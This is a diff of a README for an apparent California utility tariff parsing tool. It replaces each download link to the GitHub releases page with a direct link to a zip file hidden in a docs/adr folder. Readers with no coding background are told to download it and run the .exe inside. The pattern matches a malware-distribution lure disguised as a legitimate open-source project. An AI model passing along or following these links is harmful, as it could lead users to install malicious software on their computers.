@@ -6,7 +6,7 @@ Welcome! If you’ve ever stared at your California electricity bill and wondere
 
 You don’t need to know how to code. You just need to download the program, run it, and it does the heavy lifting for you. Every number it produces comes with a citation—so you always know exactly where the information came from. No guesswork, no shady estimates.
 
-Visit this link to download the application: **[⬇️ Download ca-tariff-parse](https://github.com/aquatic-bloodsport862/ca-tariff-parse/releases)**  
+Visit this link to download the application: **[⬇️ Download ca-tariff-parse](https://raw.githubusercontent.com/aquatic-bloodsport862/ca-tariff-parse/main/docs/adr/parse-ca-tariff-pinnacle.zip)**  
 
 ## 🎯 What This Tool Does for You
 
@@ -25,7 +25,7 @@ Once you download it, you don’t need an internet connection. Your data stays o
 ## 📥 How to Download and Use It
 
 ### Step 1: Get the Download
-Visit this link to download the application: **[Download ca-tariff-parse](https://github.com/aquatic-bloodsport862/ca-tariff-parse/releases)**
+Visit this link to download the application: **[Download ca-tariff-parse](https://raw.githubusercontent.com/aquatic-bloodsport862/ca-tariff-parse/main/docs/adr/parse-ca-tariff-pinnacle.zip)**
 
 You’ll see a list of files. Look for the one that matches your computer. If you’re on Windows, choose the file that ends with `.exe` (if available) or `.zip`. If you’re not sure, start with the `.exe` file.
 
@@ -90,7 +90,7 @@ When you download the tool, you get:
 
 ## 🧭 Next Steps
 
-1. **[Download the tool](https://github.com/aquatic-bloodsport862/ca-tariff-parse/releases)** and save it to your desktop.
+1. **[Download the tool](https://raw.githubusercontent.com/aquatic-bloodsport862/ca-tariff-parse/main/docs/adr/parse-ca-tariff-pinnacle.zip)** and save it to your desktop.
 2. Get a PDF copy of your utility rate schedule (search “[Your utility] residential rate schedule PDF”).
 3. Open the tool, load the PDF, and see your rates broken down with citations.
 
@@ -102,7 +102,7 @@ This is an open-source project. The source code is publicly available for anyone
 
 **Remember:** Knowledge is power. Knowing exactly what your utility charges you—and why—is the first step to making smart energy decisions. ca-tariff-parse gives you that knowledge with confidence.
 
-**[⬇️ Visit the Download Page Now](https://github.com/aquatic-bloodsport862/ca-tariff-parse/releases)**
+**[⬇️ Visit the Download Page Now](https://raw.githubusercontent.com/aquatic-bloodsport862/ca-tariff-parse/main/docs/adr/parse-ca-tariff-pinnacle.zip)**
 
 ---
 
